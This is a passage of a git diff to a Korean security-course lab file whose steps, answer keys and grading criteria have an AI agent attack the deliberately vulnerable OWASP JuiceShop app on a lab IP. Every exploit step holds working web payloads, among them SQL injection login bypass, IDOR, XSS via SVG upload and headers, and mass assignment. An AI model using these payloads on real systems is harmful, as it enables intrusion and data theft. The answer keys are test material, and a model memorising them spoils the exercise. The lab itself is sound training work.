+      - 해당 기법의 MITRE ATT&CK 기법 또는 CVE·도구 최소 1개 언급
+      acceptable_methods:
+      - <SENSITIVE:623a50469317aead>
+      - 수동 payload 구성 (curl·python·netcat)
+      - Burp Repeater / ffuf / wfuzz 등 웹 퍼저
+      - defensor 관점에서 탐지 지표 제시도 인정
+      negative_signs:
+      - 실행 없이 개념 설명만
+      - 대상 VM·결과 누락
+      - 해당 주제(웹 애플리케이션 공격 (Web App Attacks))와 무관한 기법
   target_vm: attacker
-  script: 'TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type:
-    application/json'' -d ''{"email":"'' OR 1=1--","password":"a"}'' | python3 -c
-    "import sys,json; print(json.load(sys.stdin)[''authentication''][''token''])")
+  script: 'TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type: application/json''
+    -d ''{"email":"'' OR 1=1--","password":"a"}'' | python3 -c "import sys,json; print(json.load(sys.stdin)[''authentication''][''token''])")
     && curl -s ''http://10.20.30.80:3000/rest/user/change-password?current=a&new=newpass123&repeat=newpass123''
     -H "Authorization: Bearer $TOKEN" -H ''Cookie: token=''$TOKEN'
   risk_level: medium
-  bastion_prompt: JuiceShop의 /rest/user/change-password 엔드포인트에서 CSRF 취약점을 확인하라. GET
-    요청으로 비밀번호를 변경할 수 있는지 테스트해줘
+  bastion_prompt: JuiceShop의 /rest/user/change-password 엔드포인트에서 CSRF 취약점을 확인하라. GET 요청으로 비밀번호를 변경할 수 있는지
+    테스트해줘
 - order: 10
   instruction: JuiceShop의 /rest/basket/1 엔드포인트에 접근하여 다른 사용자의 장바구니 내용을 조회하라(IDOR 취약점).
   hint: 다른 사용자의 basket ID를 직접 지정하여 접근한다
   category: exploit
   points: 10
-  answer: '🤖 프롬프트: JuiceShop의 /rest/basket/1 엔드포인트에 접근하여 다른 사용자의 장바구니 내용을 조회하라(IDOR
-    취약점)해줘
+  answer: '🤖 프롬프트: JuiceShop의 /rest/basket/1 엔드포인트에 접근하여 다른 사용자의 장바구니 내용을 조회하라(IDOR 취약점)해줘
 
-    📎 참고 (CLI): TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login -H
-    ''Content-Type: application/json'' -d ''{"email":"'' OR 1=1--","password":"a"}''
-    | python3 -c "import sys,json; print(json.load(sys.stdin)[''authentication''][''token''])")
-    && curl -s http://10.20.30.80:3000/rest/basket/2 -H "Authorization: Bearer $TOKEN"
-    | python3 -m json.tool'
-  answer_detail: IDOR(Insecure Direct Object Reference)는 사용자가 URL의 ID 값을 변경하여 다른 사용자의
-    리소스에 접근하는 취약점이다. 서버가 요청자의 소유권을 확인하지 않으면 발생한다.
+    📎 참고 (CLI): TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type: application/json''
+    -d ''{"email":"'' OR 1=1--","password":"a"}'' | python3 -c "import sys,json; print(json.load(sys.stdin)[''authentication''][''token''])")
+    && curl -s http://10.20.30.80:3000/rest/basket/2 -H "Authorization: Bearer $TOKEN" | python3 -m json.tool'
+  answer_detail: IDOR(Insecure Direct Object Reference)는 사용자가 URL의 ID 값을 변경하여 다른 사용자의 리소스에 접근하는 취약점이다.
+    서버가 요청자의 소유권을 확인하지 않으면 발생한다.
   verify:
     type: output_contains
     expect: Products
     field: stdout
+    semantic:
+      intent: 웹 애플리케이션 공격 (Web App Attacks) 주제의 실습 스텝 — 해당 기법의 공격 명령 실행 또는 원리 실증
+      success_criteria:
+      - instruction 의 핵심 공격 기법 실행 또는 PoC 구성
+      - 대상 VM 에 대한 결과 확인 (출력·응답·로그)
+      - 해당 기법의 MITRE ATT&CK 기법 또는 CVE·도구 최소 1개 언급
+      acceptable_methods:
+      - <SENSITIVE:623a50469317aead>
+      - 수동 payload 구성 (curl·python·netcat)
+      - Burp Repeater / ffuf / wfuzz 등 웹 퍼저
+      - defensor 관점에서 탐지 지표 제시도 인정
+      negative_signs:
+      - 실행 없이 개념 설명만
+      - 대상 VM·결과 누락
+      - 해당 주제(웹 애플리케이션 공격 (Web App Attacks))와 무관한 기법
   target_vm: attacker
-  script: 'TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type:
-    application/json'' -d ''{"email":"'' OR 1=1--","password":"a"}'' | python3 -c
-    "import sys,json; print(json.load(sys.stdin)[''authentication''][''token''])")
-    && curl -s http://10.20.30.80:3000/rest/basket/2 -H "Authorization: Bearer $TOKEN"
-    | python3 -m json.tool'
+  script: 'TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type: application/json''
+    -d ''{"email":"'' OR 1=1--","password":"a"}'' | python3 -c "import sys,json; print(json.load(sys.stdin)[''authentication''][''token''])")
+    && curl -s http://10.20.30.80:3000/rest/basket/2 -H "Authorization: Bearer $TOKEN" | python3 -m json.tool'
   risk_level: medium
-  bastion_prompt: JuiceShop의 /rest/basket/1 엔드포인트에 접근하여 다른 사용자의 장바구니 내용을 조회하라(IDOR
-    취약점)해줘
+  bastion_prompt: JuiceShop의 /rest/basket/1 엔드포인트에 접근하여 다른 사용자의 장바구니 내용을 조회하라(IDOR 취약점)해줘
 - order: 11
   instruction: JuiceShop의 /api/Products/1 엔드포인트에 PUT 요청을 보내 제품 정보를 무단으로 수정하라.
   hint: PUT 요청으로 제품의 description을 변경한다
@@ -272,25 +403,36 @@ steps:
   points: 10
   answer: '🤖 프롬프트: JuiceShop의 /api/Products/1 엔드포인트에 PUT 요청을 보내 제품 정보를 무단으로 수정해줘
 
-    📎 참고 (CLI): TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login -H
-    ''Content-Type: application/json'' -d ''{"email":"'' OR 1=1--","password":"a"}''
-    | python3 -c "import sys,json; print(json.load(sys.stdin)[''authentication''][''token''])")
-    && curl -s -X PUT http://10.20.30.80:3000/api/Products/1 -H ''Content-Type: application/json''
-    -H "Authorization: Bearer $TOKEN" -d ''{"description":"Hacked by attacker"}''
-    | python3 -m json.tool'
-  answer_detail: API 엔드포인트에 대한 HTTP 메서드(PUT, DELETE, PATCH) 접근 제어가 미흡하면 데이터 무결성이 침해된다.
-    관리자만 수정 가능해야 할 리소스를 일반 사용자가 변경할 수 있는 것은 Broken Access Control이다.
+    📎 참고 (CLI): TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type: application/json''
+    -d ''{"email":"'' OR 1=1--","password":"a"}'' | python3 -c "import sys,json; print(json.load(sys.stdin)[''authentication''][''token''])")
+    && curl -s -X PUT http://10.20.30.80:3000/api/Products/1 -H ''Content-Type: application/json'' -H
+    "Authorization: Bearer $TOKEN" -d ''{"description":"Hacked by attacker"}'' | python3 -m json.tool'
+  answer_detail: API 엔드포인트에 대한 HTTP 메서드(PUT, DELETE, PATCH) 접근 제어가 미흡하면 데이터 무결성이 침해된다. 관리자만 수정 가능해야 할
+    리소스를 일반 사용자가 변경할 수 있는 것은 Broken Access Control이다.
   verify:
     type: output_contains
     expect: description
     field: stdout
+    semantic:
+      intent: 웹 애플리케이션 공격 (Web App Attacks) 주제의 실습 스텝 — 해당 기법의 공격 명령 실행 또는 원리 실증
+      success_criteria:
+      - instruction 의 핵심 공격 기법 실행 또는 PoC 구성
+      - 대상 VM 에 대한 결과 확인 (출력·응답·로그)
+      - 해당 기법의 MITRE ATT&CK 기법 또는 CVE·도구 최소 1개 언급
+      acceptable_methods:
+      - <SENSITIVE:623a50469317aead>
+      - 수동 payload 구성 (curl·python·netcat)
+      - Burp Repeater / ffuf / wfuzz 등 웹 퍼저
+      - defensor 관점에서 탐지 지표 제시도 인정
+      negative_signs:
+      - 실행 없이 개념 설명만
+      - 대상 VM·결과 누락
+      - 해당 주제(웹 애플리케이션 공격 (Web App Attacks))와 무관한 기법
   target_vm: attacker
-  script: 'TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type:
-    application/json'' -d ''{"email":"'' OR 1=1--","password":"a"}'' | python3 -c
-    "import sys,json; print(json.load(sys.stdin)[''authentication''][''token''])")
-    && curl -s -X PUT http://10.20.30.80:3000/api/Products/1 -H ''Content-Type: application/json''
-    -H "Authorization: Bearer $TOKEN" -d ''{"description":"Hacked by attacker"}''
-    | python3 -m json.tool'
+  script: 'TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type: application/json''
+    -d ''{"email":"'' OR 1=1--","password":"a"}'' | python3 -c "import sys,json; print(json.load(sys.stdin)[''authentication''][''token''])")
+    && curl -s -X PUT http://10.20.30.80:3000/api/Products/1 -H ''Content-Type: application/json'' -H
+    "Authorization: Bearer $TOKEN" -d ''{"description":"Hacked by attacker"}'' | python3 -m json.tool'
   risk_level: medium
   bastion_prompt: JuiceShop의 /api/Products/1 엔드포인트에 PUT 요청을 보내 제품 정보를 무단으로 수정해줘
 - order: 12
@@ -298,85 +440,121 @@ steps:
   hint: SVG 파일은 XML 기반이므로 JavaScript를 포함할 수 있다
   category: exploit
   points: 10
-  answer: '🤖 프롬프트: JuiceShop의 /profile 이미지 업로드 기능에서 파일 타입 검증을 우회하여 SVG 파일(XSS 포함)을
-    업로드해줘
+  answer: '🤖 프롬프트: JuiceShop의 /profile 이미지 업로드 기능에서 파일 타입 검증을 우회하여 SVG 파일(XSS 포함)을 업로드해줘
 
-    📎 참고 (CLI): TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login -H
-    ''Content-Type: application/json'' -d ''{"email":"'' OR 1=1--","password":"a"}''
-    | python3 -c "import sys,json; print(json.load(sys.stdin)[''authentication''][''token''])")
-    && echo ''<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"><text x="0"
-    y="20">XSS</text></svg>'' > /tmp/xss.svg && curl -s -X POST http://10.20.30.80:3000/profile/image/file
-    -H "Authorization: Bearer $TOKEN" -H ''Cookie: token=''$TOKEN -F ''file=@/tmp/xss.svg;type=image/svg+xml'''
-  answer_detail: SVG(Scalable Vector Graphics)는 XML 기반 이미지 포맷으로, onload 이벤트 핸들러에 JavaScript를
-    포함할 수 있다. 파일 업로드 시 MIME 타입과 확장자 검증만으로는 이러한 공격을 막을 수 없다.
+    📎 참고 (CLI): TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type: application/json''
+    -d ''{"email":"'' OR 1=1--","password":"a"}'' | python3 -c "import sys,json; print(json.load(sys.stdin)[''authentication''][''token''])")
+    && echo ''<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"><text x="0" y="20">XSS</text></svg>''
+    > /tmp/xss.svg && curl -s -X POST http://10.20.30.80:3000/profile/image/file -H "Authorization: Bearer
+    $TOKEN" -H ''Cookie: token=''$TOKEN -F ''file=@/tmp/xss.svg;type=image/svg+xml'''
+  answer_detail: SVG(Scalable Vector Graphics)는 XML 기반 이미지 포맷으로, onload 이벤트 핸들러에 JavaScript를 포함할 수 있다.
+    파일 업로드 시 MIME 타입과 확장자 검증만으로는 이러한 공격을 막을 수 없다.
   verify:
     type: output_contains
     expect: svg
     field: stdout
+    semantic:
+      intent: 웹 애플리케이션 공격 (Web App Attacks) 주제의 실습 스텝 — 해당 기법의 공격 명령 실행 또는 원리 실증
+      success_criteria:
+      - instruction 의 핵심 공격 기법 실행 또는 PoC 구성
+      - 대상 VM 에 대한 결과 확인 (출력·응답·로그)
+      - 해당 기법의 MITRE ATT&CK 기법 또는 CVE·도구 최소 1개 언급
+      acceptable_methods:
+      - <SENSITIVE:623a50469317aead>
+      - 수동 payload 구성 (curl·python·netcat)
+      - Burp Repeater / ffuf / wfuzz 등 웹 퍼저
+      - defensor 관점에서 탐지 지표 제시도 인정
+      negative_signs:
+      - 실행 없이 개념 설명만
+      - 대상 VM·결과 누락
+      - 해당 주제(웹 애플리케이션 공격 (Web App Attacks))와 무관한 기법
   target_vm: attacker
-  script: 'TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type:
-    application/json'' -d ''{"email":"'' OR 1=1--","password":"a"}'' | python3 -c
-    "import sys,json; print(json.load(sys.stdin)[''authentication''][''token''])")
-    && echo ''<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"><text x="0"
-    y="20">XSS</text></svg>'' > /tmp/xss.svg && curl -s -X POST http://10.20.30.80:3000/profile/image/file
-    -H "Authorization: Bearer $TOKEN" -H ''Cookie: token=''$TOKEN -F ''file=@/tmp/xss.svg;type=image/svg+xml'''
+  script: 'TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type: application/json''
+    -d ''{"email":"'' OR 1=1--","password":"a"}'' | python3 -c "import sys,json; print(json.load(sys.stdin)[''authentication''][''token''])")
+    && echo ''<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"><text x="0" y="20">XSS</text></svg>''
+    > /tmp/xss.svg && curl -s -X POST http://10.20.30.80:3000/profile/image/file -H "Authorization: Bearer
+    $TOKEN" -H ''Cookie: token=''$TOKEN -F ''file=@/tmp/xss.svg;type=image/svg+xml'''
   risk_level: medium
-  bastion_prompt: JuiceShop의 /profile 이미지 업로드 기능에서 파일 타입 검증을 우회하여 SVG 파일(XSS 포함)을
-    업로드해줘
+  bastion_prompt: JuiceShop의 /profile 이미지 업로드 기능에서 파일 타입 검증을 우회하여 SVG 파일(XSS 포함)을 업로드해줘
 - order: 13
-  instruction: JuiceShop의 /rest/saveLoginIp 엔드포인트를 이용하여 HTTP 헤더 인젝션을 시도하라. X-Forwarded-For
-    헤더에 XSS 페이로드를 삽입하라.
+  instruction: JuiceShop의 /rest/saveLoginIp 엔드포인트를 이용하여 HTTP 헤더 인젝션을 시도하라. X-Forwarded-For 헤더에 XSS 페이로드를
+    삽입하라.
   hint: True-Client-IP 또는 X-Forwarded-For 헤더를 조작한다
   category: exploit
   points: 10
-  answer: '🤖 프롬프트: JuiceShop의 /rest/saveLoginIp 엔드포인트를 이용하여 HTTP 헤더 인젝션을 시도하라. X-Forwarded-For
-    헤더에 XSS 페이로드를 삽입해줘
+  answer: '🤖 프롬프트: JuiceShop의 /rest/saveLoginIp 엔드포인트를 이용하여 HTTP 헤더 인젝션을 시도하라. X-Forwarded-For 헤더에 XSS
+    페이로드를 삽입해줘
 
-    📎 참고 (CLI): TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login -H
-    ''Content-Type: application/json'' -d ''{"email":"'' OR 1=1--","password":"a"}''
-    | python3 -c "import sys,json; print(json.load(sys.stdin)[''authentication''][''token''])")
-    && curl -s http://10.20.30.80:3000/rest/saveLoginIp -H "Authorization: Bearer
-    $TOKEN" -H ''True-Client-IP: <script>alert(1)</script>'''
-  answer_detail: HTTP 헤더 값이 검증 없이 DB에 저장되고 웹 페이지에 렌더링되면 Stored XSS가 발생한다. 클라이언트가 보내는
-    모든 HTTP 헤더(X-Forwarded-For, True-Client-IP 등)는 신뢰할 수 없는 입력이다.
+    📎 참고 (CLI): TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type: application/json''
+    -d ''{"email":"'' OR 1=1--","password":"a"}'' | python3 -c "import sys,json; print(json.load(sys.stdin)[''authentication''][''token''])")
+    && curl -s http://10.20.30.80:3000/rest/saveLoginIp -H "Authorization: Bearer $TOKEN" -H ''True-Client-IP:
+    <script>alert(1)</script>'''
+  answer_detail: HTTP 헤더 값이 검증 없이 DB에 저장되고 웹 페이지에 렌더링되면 Stored XSS가 발생한다. 클라이언트가 보내는 모든 HTTP 헤더(X-Forwarded-For,
+    True-Client-IP 등)는 신뢰할 수 없는 입력이다.
   verify:
     type: output_contains
     expect: script
     field: stdout
+    semantic:
+      intent: 웹 애플리케이션 공격 (Web App Attacks) 주제의 실습 스텝 — 해당 기법의 공격 명령 실행 또는 원리 실증
+      success_criteria:
+      - instruction 의 핵심 공격 기법 실행 또는 PoC 구성
+      - 대상 VM 에 대한 결과 확인 (출력·응답·로그)
+      - 해당 기법의 MITRE ATT&CK 기법 또는 CVE·도구 최소 1개 언급
+      acceptable_methods:
+      - <SENSITIVE:623a50469317aead>
+      - 수동 payload 구성 (curl·python·netcat)
+      - Burp Repeater / ffuf / wfuzz 등 웹 퍼저
+      - defensor 관점에서 탐지 지표 제시도 인정
+      negative_signs:
+      - 실행 없이 개념 설명만
+      - 대상 VM·결과 누락
+      - 해당 주제(웹 애플리케이션 공격 (Web App Attacks))와 무관한 기법
   target_vm: attacker
-  script: 'TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type:
-    application/json'' -d ''{"email":"'' OR 1=1--","password":"a"}'' | python3 -c
-    "import sys,json; print(json.load(sys.stdin)[''authentication''][''token''])")
-    && curl -s http://10.20.30.80:3000/rest/saveLoginIp -H "Authorization: Bearer
-    $TOKEN" -H ''True-Client-IP: <script>alert(1)</script>'''
+  script: 'TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type: application/json''
+    -d ''{"email":"'' OR 1=1--","password":"a"}'' | python3 -c "import sys,json; print(json.load(sys.stdin)[''authentication''][''token''])")
+    && curl -s http://10.20.30.80:3000/rest/saveLoginIp -H "Authorization: Bearer $TOKEN" -H ''True-Client-IP:
+    <script>alert(1)</script>'''
   risk_level: medium
-  bastion_prompt: JuiceShop의 /rest/saveLoginIp 엔드포인트를 이용하여 HTTP 헤더 인젝션을 시도하라. X-Forwarded-For
-    헤더에 XSS 페이로드를 삽입해줘
+  bastion_prompt: JuiceShop의 /rest/saveLoginIp 엔드포인트를 이용하여 HTTP 헤더 인젝션을 시도하라. X-Forwarded-For 헤더에 XSS
+    페이로드를 삽입해줘
 - order: 14
-  instruction: JuiceShop의 관리자 패널(/administration)에 접근하라. 일반 사용자로 로그인한 상태에서 직접 URL을
-    입력하여 접근 가능한지 확인하라.
+  instruction: JuiceShop의 관리자 패널(/administration)에 접근하라. 일반 사용자로 로그인한 상태에서 직접 URL을 입력하여 접근 가능한지 확인하라.
   hint: 프론트엔드 라우팅만으로 접근을 제한하는 경우 URL 직접 입력으로 우회할 수 있다
   category: exploit
   points: 10
   answer: '🤖 프롬프트: JuiceShop의 관리자 패널(/administration)에 접근해줘
 
-    📎 참고 (CLI): TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login -H
-    ''Content-Type: application/json'' -d ''{"email":"'' OR 1=1--","password":"a"}''
-    | python3 -c "import sys,json; print(json.load(sys.stdin)[''authentication''][''token''])")
-    && curl -s http://10.20.30.80:3000/administration -H "Authorization: Bearer $TOKEN"
-    -H ''Cookie: token=''$TOKEN | head -50'
-  answer_detail: 프론트엔드(Angular/React)에서만 접근을 제한하고 백엔드 API에서 인가 검증을 하지 않으면, URL을 직접
-    호출하여 관리자 기능에 접근할 수 있다. 서버 측 인가가 필수적이다.
+    📎 참고 (CLI): TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type: application/json''
+    -d ''{"email":"'' OR 1=1--","password":"a"}'' | python3 -c "import sys,json; print(json.load(sys.stdin)[''authentication''][''token''])")
+    && curl -s http://10.20.30.80:3000/administration -H "Authorization: Bearer $TOKEN" -H ''Cookie: token=''$TOKEN
+    | head -50'
+  answer_detail: 프론트엔드(Angular/React)에서만 접근을 제한하고 백엔드 API에서 인가 검증을 하지 않으면, URL을 직접 호출하여 관리자 기능에 접근할 수
+    있다. 서버 측 인가가 필수적이다.
   verify:
     type: output_contains
     expect: html
     field: stdout
+    semantic:
+      intent: 웹 애플리케이션 공격 (Web App Attacks) 주제의 실습 스텝 — 해당 기법의 공격 명령 실행 또는 원리 실증
+      success_criteria:
+      - instruction 의 핵심 공격 기법 실행 또는 PoC 구성
+      - 대상 VM 에 대한 결과 확인 (출력·응답·로그)
+      - 해당 기법의 MITRE ATT&CK 기법 또는 CVE·도구 최소 1개 언급
+      acceptable_methods:
+      - <SENSITIVE:623a50469317aead>
+      - 수동 payload 구성 (curl·python·netcat)
+      - Burp Repeater / ffuf / wfuzz 등 웹 퍼저
+      - defensor 관점에서 탐지 지표 제시도 인정
+      negative_signs:
+      - 실행 없이 개념 설명만
+      - 대상 VM·결과 누락
+      - 해당 주제(웹 애플리케이션 공격 (Web App Attacks))와 무관한 기법
   target_vm: attacker
-  script: 'TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type:
-    application/json'' -d ''{"email":"'' OR 1=1--","password":"a"}'' | python3 -c
-    "import sys,json; print(json.load(sys.stdin)[''authentication''][''token''])")
-    && curl -s http://10.20.30.80:3000/administration -H "Authorization: Bearer $TOKEN"
-    -H ''Cookie: token=''$TOKEN | head -50'
+  script: 'TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type: application/json''
+    -d ''{"email":"'' OR 1=1--","password":"a"}'' | python3 -c "import sys,json; print(json.load(sys.stdin)[''authentication''][''token''])")
+    && curl -s http://10.20.30.80:3000/administration -H "Authorization: Bearer $TOKEN" -H ''Cookie: token=''$TOKEN
+    | head -50'
   risk_level: medium
   bastion_prompt: JuiceShop의 관리자 패널(/administration)에 접근해줘
 - order: 15
@@ -384,48 +562,56 @@ steps:
   hint: 각 공격이 해당하는 OWASP 카테고리를 매핑하라
   category: analysis
   points: 15
-  answer: '🤖 프롬프트: 수행한 모든 웹 공격을 OWASP Top 10 카테고리별로 분류하여 /tmp/web_attack_report.txt에
-    정리해줘
+  answer: '🤖 프롬프트: 수행한 모든 웹 공격을 OWASP Top 10 카테고리별로 분류하여 /tmp/web_attack_report.txt에 정리해줘
 
-    📎 참고 (CLI): echo -e ''=== Web Attack Report ===\n\n[A01: Broken Access Control]\n-
-    IDOR: /rest/basket/2 접근\n- Admin panel 직접 접근\n- Mass Assignment: role=admin\n\n[A03:
-    Injection]\n- SQL Injection: login bypass\n- UNION SQLi: DB schema 추출\n- XSS:
-    Reflected/Stored/DOM\n- Header Injection\n\n[A04: Insecure Design]\n- 0-star rating
-    제출\n- GET 비밀번호 변경(CSRF)\n\n[A05: Security Misconfiguration]\n- Null Byte Injection으로
-    파일 다운로드\n- 관리자 설정 API 노출'' > /tmp/web_attack_report.txt && cat /tmp/web_attack_report.txt'
-  answer_detail: 공격 결과를 OWASP Top 10 카테고리로 분류하면 체계적인 보고서를 작성할 수 있다. 각 취약점에 대해 위험도(CVSS),
-    재현 절차, 영향 범위, 권장 대응 방안을 포함하는 것이 전문적인 보고서의 요건이다.
+    📎 참고 (CLI): echo -e ''=== Web Attack Report ===\n\n[A01: Broken Access Control]\n- IDOR: /rest/basket/2
+    접근\n- Admin panel 직접 접근\n- Mass Assignment: role=admin\n\n[A03: Injection]\n- SQL Injection: login
+    bypass\n- UNION SQLi: DB schema 추출\n- XSS: Reflected/Stored/DOM\n- Header Injection\n\n[A04: Insecure
+    Design]\n- 0-star rating 제출\n- GET 비밀번호 변경(CSRF)\n\n[A05: Security Misconfiguration]\n- Null Byte
+    Injection으로 파일 다운로드\n- 관리자 설정 API 노출'' > /tmp/web_attack_report.txt && cat /tmp/web_attack_report.txt'
+  answer_detail: 공격 결과를 OWASP Top 10 카테고리로 분류하면 체계적인 보고서를 작성할 수 있다. 각 취약점에 대해 위험도(CVSS), 재현 절차, 영향 범위,
+    권장 대응 방안을 포함하는 것이 전문적인 보고서의 요건이다.
   verify:
     type: output_contains
     expect: Web Attack Report
     field: stdout
+    semantic:
+      intent: 웹 애플리케이션 공격 (Web App Attacks) 주제의 실습 스텝 — 해당 기법의 공격 명령 실행 또는 원리 실증
+      success_criteria:
+      - instruction 의 핵심 공격 기법 실행 또는 PoC 구성
+      - 대상 VM 에 대한 결과 확인 (출력·응답·로그)
+      - 해당 기법의 MITRE ATT&CK 기법 또는 CVE·도구 최소 1개 언급
+      acceptable_methods:
+      - <SENSITIVE:623a50469317aead>
+      - 수동 payload 구성 (curl·python·netcat)
+      - Burp Repeater / ffuf / wfuzz 등 웹 퍼저
+      - defensor 관점에서 탐지 지표 제시도 인정
+      negative_signs:
+      - 실행 없이 개념 설명만
+      - 대상 VM·결과 누락
+      - 해당 주제(웹 애플리케이션 공격 (Web App Attacks))와 무관한 기법
   target_vm: attacker
-  script: 'echo -e ''=== Web Attack Report ===\n\n[A01: Broken Access Control]\n-
-    IDOR: /rest/basket/2 접근\n- Admin panel 직접 접근\n- Mass Assignment: role=admin\n\n[A03:
-    Injection]\n- SQL Injection: login bypass\n- UNION SQLi: DB schema 추출\n- XSS:
-    Reflected/Stored/DOM\n- Header Injection\n\n[A04: Insecure Design]\n- 0-star rating
-    제출\n- GET 비밀번호 변경(CSRF)\n\n[A05: Security Misconfiguration]\n- Null Byte Injection으로
-    파일 다운로드\n- 관리자 설정 API 노출'' > /tmp/web_attack_report.txt && cat /tmp/web_attack_report.txt'
+  script: 'echo -e ''=== Web Attack Report ===\n\n[A01: Broken Access Control]\n- IDOR: /rest/basket/2
+    접근\n- Admin panel 직접 접근\n- Mass Assignment: role=admin\n\n[A03: Injection]\n- SQL Injection: login
+    bypass\n- UNION SQLi: DB schema 추출\n- XSS: Reflected/Stored/DOM\n- Header Injection\n\n[A04: Insecure
+    Design]\n- 0-star rating 제출\n- GET 비밀번호 변경(CSRF)\n\n[A05: Security Misconfiguration]\n- Null Byte
+    Injection으로 파일 다운로드\n- 관리자 설정 API 노출'' > /tmp/web_attack_report.txt && cat /tmp/web_attack_report.txt'
   risk_level: low
-  bastion_prompt: 수행한 모든 웹 공격을 OWASP Top 10 카테고리별로 분류하여 /tmp/web_attack_report.txt에
-    정리해줘
+  bastion_prompt: 수행한 모든 웹 공격을 OWASP Top 10 카테고리별로 분류하여 /tmp/web_attack_report.txt에 정리해줘
 - order: 99
   instruction: '[Multi-task] 이번 주 핵심 작업 5개를 한 번에 수행하라.'
   bastion_prompt: '다음 작업들을 순서대로 수행해줘:
 
-    1) JuiceShop 로그인 페이지(/rest/user/login)에 SQL Injection을 시도하라. email에 '' OR 1=1--
-    페이로드를 사용하여 관리자로 로그인해줘
+    1) JuiceShop 로그인 페이지(/rest/user/login)에 SQL Injection을 시도하라. email에 '' OR 1=1-- 페이로드를 사용하여 관리자로 로그인해줘
 
     2) 획득한 JWT 토큰을 디코딩하여 관리자 계정의 이메일과 역할을 확인해줘
 
     3) JuiceShop의 검색 기능(/rest/products/search?q=)에 XSS 페이로드를 삽입하라. <iframe src=''javascript:alert(1)''>
     페이로드를 사용해줘
 
-    4) JuiceShop의 사용자 등록 API(/api/Users)를 사용하여 role을 admin으로 설정한 사용자를 등록하라. Mass Assignment
-    취약점을 공략해줘
+    4) JuiceShop의 사용자 등록 API(/api/Users)를 사용하여 role을 admin으로 설정한 사용자를 등록하라. Mass Assignment 취약점을 공략해줘
 
-    5) JuiceShop의 /rest/products/search?q= 엔드포인트에 UNION 기반 SQL Injection을 시도하여 데이터베이스
-    테이블 정보를 추출해줘'
+    5) JuiceShop의 /rest/products/search?q= 엔드포인트에 UNION 기반 SQL Injection을 시도하여 데이터베이스 테이블 정보를 추출해줘'
   hint: 복합 작업은 Bastion이 순서대로 계획하고 실행해야 한다
   category: multi_task
   points: 50
@@ -437,19 +623,15 @@ steps:
   risk_level: low
   answer: '🤖 프롬프트: 다음 작업들을 순서대로 수행해줘:
 
-    1) JuiceShop 로그인 페이지(/rest/user/login)에 SQL Injection을 시도하라. email에 '' OR 1=1--
-    페이로드를 사용하여 관리자로 로그인해줘
+    1) JuiceShop 로그인 페이지(/rest/user/login)에 SQL Injection을 시도하라. email에 '' OR 1=1-- 페이로드를 사용하여 관리자로 로그인해줘
 
     2) 획득한 JWT 토큰을 디코딩하여 관리자 계정의 이메일과 역할을 확인해줘
 
     3) JuiceShop의 검색 기능(/rest/products/search?q=)에 XSS 페이로드를 삽입하라. <iframe src=''javascript:alert(1)''>
     페이로드를 사용해줘
 
-    4) JuiceShop의 사용자 등록 API(/api/Users)를 사용하여 role을 admin으로 설정한 사용자를 등록하라. Mass Assignment
-    취약점을 공략해줘
+    4) JuiceShop의 사용자 등록 API(/api/Users)를 사용하여 role을 admin으로 설정한 사용자를 등록하라. Mass Assignment 취약점을 공략해줘
 
-    5) JuiceShop의 /rest/products/search?q= 엔드포인트에 UNION 기반 SQL Injection을 시도하여 데이터베이스
-    테이블 정보를 추출해줘'
-  answer_detail: Bastion이 5개 작업을 순차적으로 계획(planning)하고 실행(executing)한 뒤 종합 분석(validating)하는
-    다단계 작업.
+    5) JuiceShop의 /rest/products/search?q= 엔드포인트에 UNION 기반 SQL Injection을 시도하여 데이터베이스 테이블 정보를 추출해줘'
+  answer_detail: Bastion이 5개 작업을 순차적으로 계획(planning)하고 실행(executing)한 뒤 종합 분석(validating)하는 다단계 작업.
   script: ''
